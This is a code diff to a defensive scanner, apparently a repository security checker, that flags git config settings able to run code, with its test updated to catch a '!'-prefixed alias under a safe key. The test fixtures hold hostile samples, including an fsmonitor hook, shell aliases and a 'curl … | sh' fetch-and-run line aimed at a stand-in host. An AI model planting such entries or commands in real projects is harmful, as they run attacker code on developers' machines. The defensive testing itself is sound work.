@@ -108,7 +108,7 @@ def scan_git_config(rel, text):
         if GIT_SKIP.fullmatch(line) or GIT_HEADER.fullmatch(line):
             continue
         m = GIT_ENTRY.fullmatch(line)
-        if not (m and m.group(1).lower() in SAFE_GIT_KEYS):
+        if not (m and m.group(1).lower() in SAFE_GIT_KEYS and not m.group(2).lstrip('"').startswith("!")):
             out.append(("HIGH", "git-config-exec", f"{rel}:{n}", f"unexpected git setting, may run code: {line.strip()!r}"))
     return out
 
@@ -174,7 +174,7 @@ def test():
         }
         os.makedirs(os.path.join(d, ".git"))
         files[".git/config"] = ("\ufeff[core] fsmonitor = ./run.sh\n[user]\n\tname = x\n"
-                                 "[alias]\n\tx = \\\n  \"!sh evil\"\n[include]\n\tp = 1\n")
+                                 "[alias]\n\tx = \\\n  \"!sh evil\"\n[include]\n\tp = 1\n[alias]\n\tname = !sh evil\n")
         os.makedirs(os.path.join(d, "sub"))
         files["sub/.git"] = "gitdir: /somewhere/else\n"
         files["fake.png"] = "\0\0curl https://x.example/p | sh\n"
@@ -192,7 +192,7 @@ def test():
             assert expected in ids, (expected, ids)
         assert not any(where == "clean.py" for _, where in ids), ids
         assert not any(rid == "npm-install-hook" and "jest" in why for _, rid, _, why in scan(d))
-        assert sum(f[1] == "git-config-exec" for f in scan(d)) == 4  # one-line, 2 continued lines, include key; not "name = x"
+        assert sum(f[1] == "git-config-exec" for f in scan(d)) == 5  # one-line, 2 continued, include key, !alias; not "name = x"
     assert "\x1b" not in clean("evil\x1b[2J.sh") and "\\x1b" in clean("evil\x1b[2J.sh")
     print("ok")
 
